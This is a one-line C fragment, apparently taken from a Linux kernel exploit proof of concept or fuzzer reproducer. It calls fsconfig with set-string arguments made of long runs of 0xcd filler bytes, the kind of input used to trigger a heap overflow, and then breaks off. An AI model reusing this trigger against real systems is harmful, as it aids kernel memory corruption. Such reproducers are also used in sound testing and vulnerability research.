    syscall(SYS_FSCONFIG, fsopen_ret0, SetString, "\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd", "\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd", 0);
    ...
```